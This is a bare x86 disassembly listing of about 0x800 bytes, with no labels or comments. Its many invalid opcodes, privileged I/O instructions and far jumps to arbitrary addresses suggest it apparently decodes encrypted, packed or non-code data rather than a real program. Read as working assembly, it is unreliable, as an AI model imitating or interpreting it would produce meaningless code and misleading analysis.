  403e7a:	mov    edx,0xb351deea
  403e7f:	dec    ebx
  403e80:	xchg   ebp,eax
  403e81:	movlps xmm7,QWORD PTR [edx-0x5edc6123]
  403e88:	fwait
  403e89:	dec    DWORD PTR ds:0x25fe1931
  403e8f:	adc    dl,BYTE PTR [ecx-0x6b2885e4]
  403e95:	jne    0x403e7c
  403e97:	mov    ecx,0x6b7bb388
  403e9c:	dec    eax
  403e9d:	pop    esi
  403e9e:	mov    al,0xa8
  403ea0:	jle    0x403edc
  403ea2:	dec    edi
  403ea3:	sbb    al,0xaa
  403ea5:	mov    cl,0x75
  403ea7:	and    esi,DWORD PTR [eax+0x37]
  403eaa:	jns    0x403ec6
  403eac:	mov    DWORD PTR [ecx-0x6164066e],edx
  403eb2:	and    al,cl
  403eb4:	push   esi
  403eb5:	add    al,0xcd
  403eb7:	mov    al,0xbd
  403eb9:	ret    0x8455
  403ebc:	stos   DWORD PTR es:[edi],eax
  403ebd:	in     eax,dx
  403ebe:	adc    ecx,DWORD PTR [ebp+0x1942b0cc]
  403ec4:	lahf   
  403ec5:	add    al,0x47
  403ec7:	adc    ebp,DWORD PTR [ecx-0x4013cec7]
  403ecd:	mul    DWORD PTR [eax+0x18ca6ee3]
  403ed3:	mov    esp,0xf48f1b9b
  403ed8:	fldcw  WORD PTR [edx+0x17]
  403edb:	out    dx,al
  403edc:	xchg   esi,eax
  403edd:	lock xor al,0xed
  403ee0:	mov    eax,0xd530cca1
  403ee5:	rcr    BYTE PTR [esp+ebx*8],cl
  403ee8:	add    al,0x28
  403eea:	mov    bh,0x9a
  403eec:	xchg   ecx,eax
  403eed:	leave  
  403eee:	mov    ds:0x2793f294,al
  403ef3:	dec    esi
  403ef4:	ss mov dl,0xfc
  403ef7:	call   DWORD PTR [edx+edx*8-0xe]
  403efb:	in     al,dx
  403efc:	jmp    0xd9e48e79
  403f01:	jp     0x403f76
  403f03:	pop    ss
  403f04:	neg    BYTE PTR [edi]
  403f06:	push   esp
  403f07:	xchg   ecx,eax
  403f08:	push   0x7c0219c2
  403f0d:	pop    ebx
  403f0e:	mov    esi,0x94cba386
  403f13:	loopne 0x403f41
  403f15:	int3   
  403f16:	jae    0x403f58
  403f18:	dec    ecx
  403f19:	adc    BYTE PTR [esp+eax*4-0x54],cl
  403f1d:	rol    DWORD PTR [edx],0x47
  403f20:	pop    ecx
  403f21:	pop    esp
  403f22:	dec    ebp
  403f23:	out    dx,eax
  403f24:	lds    edx,FWORD PTR [ebp-0x7cb88742]
  403f2a:	aad    0x35
  403f2c:	cwde   
  403f2d:	test   DWORD PTR [ebx],0x99a25765
  403f33:	lods   al,BYTE PTR ds:[esi]
  403f34:	jmp    0x191cc575
  403f39:	adc    eax,0x650ec1c5
  403f3e:	add    BYTE PTR [edx-0x10],dh
  403f41:	mov    dh,0x29
  403f43:	pop    ebp
  403f44:	int3   
  403f45:	sub    esp,ebx
  403f47:	pusha  
  403f48:	cmp    al,BYTE PTR [ecx-0xd]
  403f4b:	inc    ebx
  403f4c:	imul   edi,DWORD PTR [edx+0x67ba3bf4],0x8fb010fb
  403f56:	sub    edi,DWORD PTR [ebp+0x4d]
  403f59:	jmp    0x403f45
  403f5b:	pxor   mm3,mm5
  403f5e:	gs (bad) 
  403f60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f61:	inc    edi
  403f62:	retf   
  403f63:	xor    BYTE PTR [ebp-0x759bba3c],0x6c
  403f6a:	sub    DWORD PTR [edi-0x401d335],edx
  403f70:	mov    ds:0x8de248e5,al
  403f75:	fiadd  WORD PTR [ebp-0x46]
  403f78:	mov    esp,0xe70c0fbf
  403f7d:	or     ebx,edx
  403f7f:	push   es
  403f80:	cmc    
  403f81:	xor    BYTE PTR [edi],bh
  403f83:	sub    ah,BYTE PTR [esi-0x2cfc54c7]
  403f89:	xchg   BYTE PTR [esi-0x16aad04b],al
  403f8f:	inc    ebx
  403f90:	mov    ch,0x73
  403f92:	jmp    0x7b6d9350
  403f97:	loope  0x403f65
  403f99:	mov    ds:0xa00b944d,eax
  403f9e:	cdq    
  403f9f:	cmp    bl,bl
  403fa1:	repz scas al,BYTE PTR es:[edi]
  403fa3:	es leave 
  403fa5:	fidivr DWORD PTR ds:[esi+0x38]
  403fa9:	inc    esi
  403faa:	mov    BYTE PTR [bp+di],dh
  403fad:	xchg   esi,eax
  403fae:	xor    ebx,DWORD PTR [ebp+0x7d]
  403fb1:	out    0xfb,eax
  403fb3:	jmp    0xa174:0x1a8d8e98
  403fba:	mov    edi,0x2b40ec77
  403fbf:	cli    
  403fc0:	mov    esi,0xcd115b3d
  403fc5:	xchg   edx,eax
  403fc6:	out    0x95,al
  403fc8:	pop    edx
  403fc9:	ror    edi,1
  403fcb:	ror    DWORD PTR [esi-0x10f2e919],0x89
  403fd2:	cwde   
  403fd3:	dec    eax
  403fd4:	leave  
  403fd5:	repz in al,dx
  403fd7:	mov    bl,0x4a
  403fd9:	inc    eax
  403fda:	sahf   
  403fdb:	push   ebx
  403fdc:	push   0xd38ed547
  403fe1:	push   esp
  403fe2:	jmp    0x403fc3
  403fe4:	push   es
  403fe5:	pop    esi
  403fe6:	daa    
  403fe7:	pop    esi
  403fe8:	sbb    esi,DWORD PTR [edi+0x45]
  403feb:	ja     0x40401b
  403fed:	rol    BYTE PTR [esi+0x1e85ab87],0xe6
  403ff4:	sub    eax,0x420185bb
  403ff9:	fldenv ds:0x52d767f8
  403fff:	rcr    eax,cl
  404001:	sti    
  404002:	call   0xa4ae:0xde6e43ba
  404009:	sbb    BYTE PTR [eax+edi*4+0x5338de2c],cl
  404010:	jmp    0x63b6:0x7a8fc17d
  404017:	cwde   
  404018:	mov    ds:0xc67eb1e3,eax
  40401d:	scas   al,BYTE PTR es:[edi]
  40401e:	xor    al,0xfe
  404020:	mov    BYTE PTR [edi-0x27],ah
  404023:	(bad)  
  404024:	dec    DWORD PTR [ecx]
  404026:	ins    DWORD PTR es:[edi],dx
  404027:	scas   eax,DWORD PTR es:[edi]
  404028:	pushf  
  404029:	mov    edx,0x75775ea5
  40402e:	inc    ecx
  40402f:	imul   esp,DWORD PTR [ebp+0x7e],0x6c83806
  404036:	sub    eax,0x68d7efec
  40403b:	shl    BYTE PTR [ecx-0x2dd02b65],0x22
  404042:	push   cs
  404043:	aam    0xc7
  404045:	cmp    ebx,DWORD PTR [ebx+0x29298bb1]
  40404b:	cdq    
  40404c:	fisubr WORD PTR [edx+0xa7c50c9]
  404052:	jo     0x403fe2
  404054:	ins    DWORD PTR es:[edi],dx
  404055:	out    0xe6,al
  404057:	and    edi,DWORD PTR [ebx+ecx*1-0xe7b287e]
  40405e:	sbb    BYTE PTR cs:[edx],ch
  404061:	jmp    0xff15:0xb3455cff
  404068:	or     eax,0x613f7c07
  40406d:	hlt    
  40406e:	(bad)  
  40406f:	rcr    DWORD PTR [ebx+0x1f],1
  404072:	jle    0x404077
  404074:	mov    esi,0x5f4b36ae
  404079:	cmp    al,0xeb
  40407b:	es xchg ebx,eax
  40407d:	fsubr  QWORD PTR [edx]
  40407f:	fistp  WORD PTR [eax-0x33e47389]
  404085:	nop
  404086:	in     eax,dx
  404087:	mov    ah,0xee
  404089:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40408a:	jecxz  0x40406a
  40408c:	add    BYTE PTR [ebx],dl
  40408e:	mov    al,0x6e
  404090:	inc    edx
  404091:	pop    ebp
  404092:	(bad)  
  404093:	clc    
  404094:	imul   eax,DWORD PTR [edx+esi*8-0x3f],0xfffffff6
  404099:	test   DWORD PTR [edx-0x73],ebp
  40409c:	cld    
  40409d:	outs   dx,DWORD PTR ds:[esi]
  40409e:	ret    
  40409f:	repnz (bad) 
  4040a1:	add    BYTE PTR [eax],ah
  4040a3:	cli    
  4040a4:	sub    DWORD PTR [edi+0x7],ebx
  4040a7:	or     BYTE PTR [ebx+0x789af848],bh
  4040ad:	mov    esp,DWORD PTR [esi-0x7cdb1b3d]
  4040b3:	jbe    0x4040d2
  4040b5:	dec    esp
  4040b6:	push   0x3f3c0e4c
  4040bb:	inc    ebp
  4040bc:	push   cs
  4040bd:	adc    ch,BYTE PTR [ebp-0x5d009452]
  4040c3:	push   eax
  4040c4:	xchg   esp,eax
  4040c5:	mov    ch,0x1a
  4040c7:	adc    al,0xe4
  4040c9:	or     al,0x50
  4040cb:	stos   BYTE PTR es:[edi],al
  4040cc:	aaa    
  4040cd:	call   0xe77833ec
  4040d2:	fisub  DWORD PTR [eax]
  4040d4:	sub    bl,BYTE PTR [edi+0x2571bfeb]
  4040da:	loop   0x404065
  4040dc:	retf   
  4040dd:	mov    ds:0xf1661dd0,al
  4040e2:	in     eax,dx
  4040e3:	je     0x40406b
  4040e5:	(bad)
  4040ea:	ficom  DWORD PTR [esi]
  4040ec:	fst    QWORD PTR [edx+0x7]
  4040ef:	pop    esp
  4040f0:	es mov eax,0xd44b4bdc
  4040f6:	and    al,BYTE PTR [edi]
  4040f8:	cdq    
  4040f9:	pop    edx
  4040fa:	hlt    
  4040fb:	mov    cl,0x3a
  4040fd:	and    dh,dl
  4040ff:	iret   
  404100:	mov    edx,0x14e611dd
  404105:	das    
  404106:	add    ecx,DWORD PTR [ebx+0x19]
  404109:	dec    BYTE PTR [edx+eiz*8+0x79]
  40410d:	jne    0x4040b7
  40410f:	mov    dl,0x19
  404111:	pop    ds
  404112:	mov    eax,ds:0x98cc6525
  404117:	adc    eax,0x975334f1
  40411c:	fiadd  WORD PTR [eax-0x55b7e029]
  404122:	mov    al,ds:0x6d5436b9
  404127:	mov    fs,WORD PTR [edx+0x1f]
  40412a:	xchg   esi,eax
  40412b:	loopne 0x404179
  40412d:	call   0xf69248aa
  404132:	push   ss
  404133:	pop    edx
  404134:	out    0x71,al
  404136:	lock push eax
  404138:	pop    esp
  404139:	push   ebx
  40413a:	mov    al,ds:0x27589720
  40413f:	pop    esp
  404140:	push   edi
  404141:	clc    
  404142:	sbb    eax,0x1d360e53
  404147:	and    esp,esi
  404149:	adc    DWORD PTR [edx-0x56],ecx
  40414c:	fwait
  40414d:	(bad)  
  40414e:	loopne 0x4040d0
  404150:	inc    eax
  404151:	jl     0x4041ce
  404153:	xor    al,0x52
  404155:	sti    
  404156:	mov    ss,ebx
  404158:	inc    edi
  404159:	sbb    al,0xc7
  40415b:	pop    eax
  40415c:	cld    
  40415d:	aaa    
  40415e:	out    dx,al
  40415f:	mov    ds:0x149486f9,al
  404164:	mov    ds:0xb1dcf572,al
  404169:	inc    ebp
  40416a:	aaa    
  40416b:	nop
  40416c:	cmp    eax,0x13610b42
  404171:	ja     0x404187
  404173:	push   eax
  404174:	dec    ebx
  404175:	sbb    eax,0x35ad31c7
  40417a:	mov    esp,0x817c56be
  404180:	loopne 0x4041c8
  404182:	add    esi,esi
  404184:	or     eax,DWORD PTR [ebx]
  404186:	(bad)  
  404187:	mov    ebp,0x79453dbe
  40418c:	pop    es
  40418d:	in     eax,0xd
  40418f:	xor    al,0xd7
  404191:	mov    ah,0xf1
  404193:	lods   eax,DWORD PTR ds:[esi]
  404194:	inc    edi
  404195:	sub    dl,ch
  404197:	mov    edi,ecx
  404199:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40419a:	jl     0x4041d2
  40419c:	aas    
  40419d:	or     ebx,DWORD PTR [ebx+0x2521be23]
  4041a3:	push   edi
  4041a4:	xchg   esi,eax
  4041a5:	sti    
  4041a6:	aad    0xbe
  4041a8:	or     ebp,DWORD PTR [ebx-0x68e93cfb]
  4041ae:	inc    ebx
  4041af:	or     DWORD PTR [eax],ebp
  4041b1:	repnz push 0x1d
  4041b4:	cs out 0xa7,eax
  4041b7:	jmp    FWORD PTR [eax+eiz*8-0x46]
  4041bb:	outs   dx,DWORD PTR ds:[esi]
  4041bc:	(bad)  
  4041bd:	pop    ss
  4041be:	or     al,0x9c
  4041c0:	pop    edi
  4041c1:	rol    BYTE PTR [ebx+eax*1+0x34],1
  4041c5:	stc    
  4041c6:	add    eax,0xbf2702a6
  4041cb:	lahf   
  4041cc:	cmp    BYTE PTR [ecx],0xbb
  4041cf:	pop    esi
  4041d0:	sub    BYTE PTR [esi+eax*1-0x15079e98],bh
  4041d7:	pop    es
  4041d8:	in     al,0x81
  4041da:	mov    ds:0x2603bcc9,al
  4041df:	popf   
  4041e0:	xlat   BYTE PTR ds:[ebx]
  4041e1:	sub    eax,0x1acee267
  4041e6:	and    DWORD PTR [edx+edx*2-0x4e9548e],edx
  4041ed:	push   0xffffffc0
  4041ef:	hlt    
  4041f0:	xchg   esi,eax
  4041f1:	loopne 0x4041ea
  4041f3:	lods   eax,DWORD PTR ds:[esi]
  4041f4:	mov    ecx,0x93b0eccc
  4041f9:	mov    al,0x89
  4041fb:	cmp    eax,0x45667657
  404200:	mov    dh,0x65
  404202:	jno    0x40426a
  404204:	pushf  
  404205:	scas   eax,DWORD PTR es:[edi]
  404206:	call   0xea72:0xa2e0c7f9
  40420d:	xor    edx,DWORD PTR [eax+ecx*1]
  404210:	gs int3 
  404212:	(bad)  
  404213:	retf   
  404214:	mov    eax,ds:0x1e1ac05a
  404219:	inc    ebp
  40421a:	fstp   QWORD PTR [ebx+edi*4-0x7c]
  40421e:	xor    DWORD PTR [ecx+0x4ac6acf8],ecx
  404224:	call   0x5e22744c
  404229:	into   
  40422a:	test   DWORD PTR [ecx+0x1d],0x7046d625
  404231:	mov    al,ds:0x28fbd1c9
  404236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404237:	mov    al,ds:0x1c6ebf71
  40423c:	pop    eax
  40423d:	add    al,0x3a
  40423f:	sub    dh,BYTE PTR [esi]
  404241:	xchg   ebx,eax
  404242:	aas    
  404243:	(bad)  
  404246:	je     0x404245
  404248:	jae    0x4041fb
  40424a:	or     al,0x56
  40424c:	jae    0x4041d3
  40424e:	outs   dx,BYTE PTR ds:[esi]
  40424f:	xchg   edx,esp
  404251:	leave  
  404252:	mov    eax,0x7ea024b0
  404257:	jle    0x404225
  404259:	sbb    bh,ah
  40425b:	and    BYTE PTR [eax-0x51],bl
  40425e:	mov    ds:0x18d065d4,al
  404263:	jp     0x4042a4
  404265:	cmp    bl,BYTE PTR [edi]
  404267:	cdq    
  404268:	mov    cl,0x43
  40426a:	and    DWORD PTR [edi],0x71dbd2ac
  404270:	pop    ds
  404271:	cdq    
  404272:	mov    dh,0x30
  404274:	pop    ecx
  404275:	mov    ecx,0xdc270ce4
  40427a:	lods   al,BYTE PTR ds:[esi]
  40427b:	mov    esi,0x58d69c1
  404280:	iret   
  404281:	stos   DWORD PTR es:[edi],eax
  404282:	adc    edi,0xffffffdf
  404285:	sbb    eax,0x9cb79f8b
  40428a:	out    0x93,al
  40428c:	hlt    
  40428d:	fld    TBYTE PTR [ebp-0x1c8548e9]
  404293:	sbb    BYTE PTR [esi-0x7a],ah
  404296:	mov    eax,0xaa57b945
  40429b:	push   edi
  40429c:	aam    0x88
  40429e:	push   eax
  40429f:	loopne 0x404267
  4042a1:	iret   
  4042a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042a3:	jp     0x404284
  4042a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042a6:	or     DWORD PTR [esi+esi*8+0x63a8dd80],esp
  4042ad:	les    ecx,FWORD PTR [edi+0x6e4bc2ad]
  4042b3:	sbb    ah,BYTE PTR [ecx]
  4042b5:	inc    esi
  4042b6:	out    0xd,eax
  4042b8:	cdq    
  4042b9:	sahf   
  4042ba:	sub    esp,DWORD PTR [edi]
  4042bc:	mov    eax,ds:0xafe2a28a
  4042c1:	pop    ecx
  4042c2:	aaa    
  4042c3:	mov    ecx,0x5927ee5f
  4042c8:	fistp  QWORD PTR [ebp+0x74]
  4042cb:	ins    DWORD PTR es:[edi],dx
  4042cc:	mov    esi,?
  4042ce:	or     ebp,DWORD PTR cs:[ecx-0x28ef163a]
  4042d5:	nop
  4042d6:	mov    ecx,0x4d9502d8
  4042db:	pop    eax
  4042dc:	popa   
  4042dd:	in     eax,dx
  4042de:	aam    0x68
  4042e0:	mov    ds:0xd2549bba,al
  4042e5:	inc    edi
  4042e6:	test   eax,0xb15341f6
  4042eb:	outs   dx,BYTE PTR ds:[esi]
  4042ec:	(bad)  
  4042ee:	dec    eax
  4042ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042f0:	mov    DWORD PTR [ebp+0x3f1b0750],ecx
  4042f6:	and    eax,0x2f6c5dcf
  4042fb:	pop    esp
  4042fc:	mov    dl,0x24
  4042fe:	cmp    DWORD PTR [ebp-0x52373769],edx
  404304:	mov    esp,0x40e3ffcc
  404309:	pop    edi
  40430a:	mov    esi,0x5900cbcf
  40430f:	leave  
  404310:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404311:	icebp  
  404312:	int    0xfc
  404314:	hlt    
  404315:	loope  0x40438f
  404317:	adc    BYTE PTR [esi-0x54585f2e],0xc4
  40431e:	fwait
  40431f:	je     0x404362
  404321:	ins    DWORD PTR es:[edi],dx
  404322:	stc    
  404323:	and    BYTE PTR [ecx+eax*8-0x3dfa3861],al
  40432a:	xor    ecx,DWORD PTR [esp+ebp*1+0x49]
  40432e:	fidiv  WORD PTR [edx+0xe13ec3b]
  404334:	mov    dl,0x47
  404336:	(bad)  
  404337:	je     0x4042f2
  404339:	xchg   edi,eax
  40433a:	inc    edx
  40433b:	daa    
  40433c:	(bad)  [edi+ebx*2-0x2b8e006d]
  404343:	xchg   DWORD PTR [ecx+0x63a8663f],eax
  404349:	sbb    eax,0x1bd768d4
  40434e:	push   ds
  40434f:	dec    eax
  404350:	int3   
  404351:	retf   
  404352:	arpl   WORD PTR [edx+ebp*1+0x7e],si
  404356:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404357:	fstp   TBYTE PTR [eax-0x1a]
  40435a:	mov    dh,0xec
  40435c:	pop    eax
  40435d:	dec    edi
  40435e:	rcl    DWORD PTR [esi],cl
  404360:	jge    0x4043b6
  404362:	sbb    BYTE PTR [edi+0x1b],ch
  404365:	push   0xd433736f
  40436a:	jge    0x404309
  40436c:	(bad)  
  40436d:	mov    bl,0xc1
  40436f:	jb     0x40436c
  404371:	pusha  
  404372:	cli    
  404373:	mov    DWORD PTR [esi-0x5b8560aa],edx
  404379:	addr16 dec eax
  40437b:	popa   
  40437c:	pusha  
  40437d:	pop    edx
  40437e:	ins    DWORD PTR es:[edi],dx
  40437f:	mov    ch,0x76
  404381:	cli    
  404382:	btr    DWORD PTR [edx-0x7e3aaebc],edi
  404389:	xor    dl,al
  40438b:	adc    eax,0xbbc83eeb
  404390:	enter  0xdf78,0x54
  404394:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404395:	and    esp,ecx
  404397:	mov    DWORD PTR es:[edx+0x30],ebx
  40439b:	mov    eax,ds:0x4696d9c4
  4043a0:	shl    DWORD PTR [edx+0x4bb5a3a8],0x9d
  4043a7:	cmp    DWORD PTR [ebp+0x1d],ebp
  4043aa:	dec    ebx
  4043ab:	adc    BYTE PTR [edi+0x67],al
  4043ae:	popf   
  4043af:	(bad)  
  4043b0:	ds xor al,0x66
  4043b3:	jne    0x404336
  4043b5:	ror    BYTE PTR [ebx-0x7f89afcf],0x55
  4043bc:	popf   
  4043bd:	sub    eax,0xd72357f7
  4043c2:	sub    al,al
  4043c4:	mov    DWORD PTR [ecx],edx
  4043c6:	add    al,0x82
  4043c8:	fld    TBYTE PTR [edx]
  4043ca:	dec    edx
  4043cb:	add    ebx,DWORD PTR [ecx-0x59bf7a6]
  4043d1:	std    
  4043d2:	jle    0x404386
  4043d4:	pop    eax
  4043d5:	das    
  4043d6:	out    dx,al
  4043d7:	fstp   DWORD PTR [eax+0x10]
  4043da:	mov    ah,0x97
  4043dc:	jns    0x40440b
  4043de:	jge    0x404377
  4043e0:	mov    dl,BYTE PTR gs:[ecx-0x6e]
  4043e4:	mov    ah,0x32
  4043e6:	add    eax,0x37e4966b
  4043eb:	mov    ah,BYTE PTR [ebx]
  4043ed:	jno    0x404382
  4043ef:	mov    BYTE PTR es:[esi],ah
  4043f2:	sub    ebx,DWORD PTR [eax+0x44a38772]
  4043f8:	sub    al,0x30
  4043fa:	mov    ebp,0xb4904f61
  4043ff:	cmp    eax,esp
  404401:	or     esi,edx
  404403:	cmp    esp,DWORD PTR [ebx+0x71487cde]
  404409:	inc    ebx
  40440a:	aad    0xf8
  40440c:	inc    ebp
  40440d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40440e:	(bad)  
  40440f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404410:	mul    dl
  404412:	adc    eax,0x5512f2a8
  404417:	xchg   esp,eax
  404418:	hlt    
  404419:	xchg   esp,eax
  40441a:	sti    
  40441b:	js     0x4043d2
  40441d:	mov    edx,?
  40441f:	pop    edi
  404420:	dec    ecx
  404421:	push   cs
  404422:	pop    edi
  404423:	sbb    DWORD PTR [ecx+0x9],eax
  404426:	adc    eax,0xd81826ee
  40442b:	in     al,0x6f
  40442d:	inc    edx
  40442e:	aam    0xd1
  404430:	stos   BYTE PTR es:[edi],al
  404431:	sub    al,0x29
  404433:	je     0x40440f
  404435:	rcl    BYTE PTR ds:0x36d9726b,cl
  40443b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40443c:	stos   BYTE PTR es:[edi],al
  40443d:	lock (bad) [ebp-0x63e69c19]
  404444:	ja     0x4044b4
  404446:	(bad)  
  404447:	xor    DWORD PTR [edi+ecx*8],esp
  40444a:	push   edx
  40444b:	xchg   ecx,eax
  40444c:	fdivr  DWORD PTR [ecx-0x1365f5e6]
  404452:	add    DWORD PTR [eax],ecx
  404454:	sbb    ah,0x39
  404457:	dec    esi
  404458:	mov    ax,ds:0x159c424a
  40445e:	jns    0x404453
  404460:	sbb    al,0xd2
  404462:	jno    0x404471
  404464:	xchg   esp,eax
  404465:	mov    esi,0x602f576e
  40446a:	repnz jmp 0x6685:0x360fe999
  404472:	arpl   sp,bp
  404474:	std    
  404475:	into   
  404476:	mov    WORD PTR [ecx+0x14d7154d],cs
  40447c:	xchg   edi,eax
  40447d:	fisub  DWORD PTR [ecx-0x42ef58cb]
  404483:	std    
  404484:	adc    al,0xda
  404486:	dec    ebp
  404487:	cmp    eax,DWORD PTR [esi]
  404489:	jns    0x40442e
  40448b:	cmc    
  40448c:	xchg   ebx,eax
  40448d:	mov    bh,0xb
  40448f:	jno    0x404424
  404491:	popf   
  404492:	dec    edi
  404493:	arpl   WORD PTR [ebx-0x8],si
  404496:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404497:	mov    edi,0x386fa354
  40449c:	daa    
  40449d:	mov    edi,0xfe0a198b
  4044a2:	inc    eax
  4044a3:	and    eax,0xc3a972b5
  4044a8:	jmp    ecx
  4044aa:	jmp    0x7e7c76dc
  4044af:	mov    eax,ds:0x4dabb988
  4044b4:	popa   
  4044b5:	icebp  
  4044b6:	mov    bh,0x66
  4044b8:	arpl   ax,bp
  4044ba:	push   edx
  4044bb:	ins    DWORD PTR es:[edi],dx
  4044bc:	ds pop ss
  4044be:	mov    eax,0x28e1f96
  4044c3:	repz push ebx
  4044c5:	cli    
  4044c6:	mov    edx,0x499219bc
  4044cb:	hlt    
  4044cc:	adc    ebp,DWORD PTR [ecx]
  4044ce:	ins    DWORD PTR es:[edi],dx
  4044cf:	xchg   ah,dl
  4044d1:	(bad)  
  4044d2:	stc    
  4044d3:	imul   ecx,DWORD PTR [edx],0x78
  4044d6:	push   cs
  4044d7:	ret    
  4044d8:	push   ecx
  4044d9:	scas   eax,DWORD PTR es:[edi]
  4044da:	xchg   ebx,eax
  4044db:	mov    ds:0x15554dd5,eax
  4044e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044e1:	xor    dl,dl
  4044e3:	cmp    BYTE PTR [esi],dh
  4044e5:	scas   al,BYTE PTR es:[edi]
  4044e6:	xor    BYTE PTR [ebx+0x14],al
  4044e9:	pop    ds
  4044ea:	jae    0x4044a8
  4044ec:	mov    ?,esp
  4044ee:	or     ch,BYTE PTR [ebp+ebp*8+0x14bd4cb5]
  4044f5:	jbe    0x40447e
  4044f7:	sbb    bl,BYTE PTR [eax+0x9fab0e9]
  4044fd:	enter  0xb2ca,0xd5
  404501:	dec    esp
  404502:	jg     0x40457f
  404504:	and    al,0x4f
  404506:	outs   dx,DWORD PTR ds:[esi]
  404507:	mov    al,ds:0xb8998605
  40450c:	jmp    0x4044c5
  40450e:	scas   eax,DWORD PTR es:[edi]
  40450f:	sbb    DWORD PTR [edx+0xa],edi
  404512:	inc    edx
  404513:	out    0x15,al
  404515:	retf   
  404516:	and    DWORD PTR [esi-0x1cc206b1],esi
  40451c:	jne    0x40453c
  40451e:	xor    eax,0xd0dc7d55
  404523:	push   0xffffffc3
  404525:	xchg   ecx,eax
  404526:	cmp    al,0x27
  404528:	neg    cl
  40452a:	and    al,0x5b
  40452c:	mov    edx,esp
  40452e:	ins    DWORD PTR es:[edi],dx
  40452f:	je     0x4044dc
  404531:	push   cs
  404532:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404533:	mov    edi,0x4055ba83
  404538:	ret    
  404539:	jmp    0x4045b0
  40453b:	sub    al,ah
  40453d:	mov    al,ds:0xe7c0ad23
  404542:	lods   eax,DWORD PTR cs:[esi]
  404544:	mov    ch,0x64
  404546:	dec    esi
  404547:	fidiv  DWORD PTR [ecx]
  404549:	jae    0x4044d2
  40454b:	xor    dh,ch
  40454d:	cmc    
  40454e:	out    0x50,al
  404550:	stos   BYTE PTR es:[edi],al
  404551:	mov    eax,ds:0x5f525777
  404556:	int3   
  404557:	(bad)  
  404558:	stos   DWORD PTR es:[edi],eax
  404559:	scas   al,BYTE PTR es:[edi]
  40455a:	icebp  
  40455b:	inc    BYTE PTR [ebx+0x38b7d198]
  404561:	and    eax,0xe87ab2b0
  404566:	sub    eax,0xd0522a4d
  40456b:	cmp    esp,DWORD PTR ds:0xb964b90f
  404571:	pushf  
  404572:	scas   al,BYTE PTR es:[edi]
  404573:	push   ebx
  404574:	(bad)  
  404575:	push   ecx
  404576:	push   esp
  404577:	out    0xfa,eax
  404579:	ret    0xb481
  40457c:	ja     0x404573
  40457e:	cmc    
  40457f:	mov    ds:0x62d5d2be,eax
  404584:	sar    DWORD PTR [ebx-0x6b],cl
  404587:	sbb    bh,BYTE PTR [eax-0x5c]
  40458a:	scas   eax,DWORD PTR es:[edi]
  40458b:	inc    ebx
  40458c:	mov    eax,0x27818f02
  404591:	stos   BYTE PTR es:[edi],al
  404592:	inc    ebp
  404593:	daa    
  404594:	sti    
  404595:	mov    ebx,0xfb8bc17d
  40459a:	sbb    DWORD PTR [eax],esi
  40459c:	mov    cl,0xf4
  40459e:	pop    esi
  40459f:	shl    BYTE PTR [ebx+eiz*1+0x53cb7795],0xdc
  4045a7:	jg     0x40459f
  4045a9:	inc    ebp
  4045aa:	mov    ebp,0x652c622e
  4045af:	ret    0xa5a1
  4045b2:	mov    ds:0x19fbcd6c,al
  4045b7:	dec    esi
  4045b8:	outs   dx,BYTE PTR ds:[esi]
  4045b9:	sbb    esi,DWORD PTR [esi-0x76]
  4045bc:	fnstcw WORD PTR [edi]
  4045be:	adc    al,0xd7
  4045c0:	inc    eax
  4045c1:	sti    
  4045c2:	cmp    DWORD PTR [ecx-0x9],ebx
  4045c5:	bound  edi,QWORD PTR [edx]
  4045c7:	cmp    ah,BYTE PTR [esi+0x6151798e]
  4045cd:	std    
  4045ce:	lock data16 lock shl bl,1
  4045d3:	add    al,0xaa
  4045d5:	sbb    eax,0x1f09f3ac
  4045da:	and    eax,0x15d7dad5
  4045df:	xchg   ebx,eax
  4045e0:	xchg   esi,eax
  4045e1:	js     0x4045d9
  4045e3:	pop    ecx
  4045e4:	aas    
  4045e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045e6:	lods   eax,DWORD PTR ds:[esi]
  4045e7:	and    dl,dl
  4045e9:	or     DWORD PTR [ebx+0x7b67824c],ebx
  4045ef:	or     BYTE PTR [esi+edi*2+0x24],bh
  4045f3:	sub    dh,BYTE PTR [eax+0x5f]
  4045f6:	cmp    eax,0x3988cfed
  4045fb:	(bad)  
  4045fc:	(bad)  
  4045fe:	sbb    bl,bh
  404600:	mov    cl,0x24
  404602:	enter  0x48e1,0x79
  404606:	lock mov dh,0x51
  404609:	adc    al,0xd5
  40460b:	repnz dec ecx
  40460d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40460e:	push   esp
  40460f:	dec    esp
  404610:	pop    ds
  404611:	adc    al,0xb4
  404613:	aaa    
  404614:	cld    
  404615:	bound  esp,QWORD PTR [ebp-0x5e]
  404618:	stos   DWORD PTR es:[edi],eax
  404619:	cmp    esp,DWORD PTR [ebx-0x7db89ea2]
  40461f:	inc    edx
  404620:	call   0xf9c3:0x9282367
  404627:	cmp    al,BYTE PTR [edi+0x48768dbf]
  40462d:	mov    DWORD PTR [ebp-0x3c],esi
  404630:	push   es
  404631:	dec    eax
  404632:	fwait
  404633:	sub    eax,0x422f5033
  404638:	push   eax
  404639:	push   esi
  40463a:	sbb    al,0x57
  40463c:	mov    WORD PTR [esp+ecx*2],gs
  40463f:	pushf  
  404640:	add    bh,BYTE PTR ds:0x49f5526a
  404646:	out    0xe1,al
  404648:	idiv   DWORD PTR [esi+0x393cf90d]
  40464e:	aas    
  40464f:	mov    edi,0x2f885b12
  404654:	mov    esp,0x4502cca7
  404659:	jecxz  0x4046c2
  40465b:	aam    0xe2
  40465d:	or     ebp,0xffffffee
  404660:	push   cs
  404661:	div    bh
  404663:	jbe    0x404662
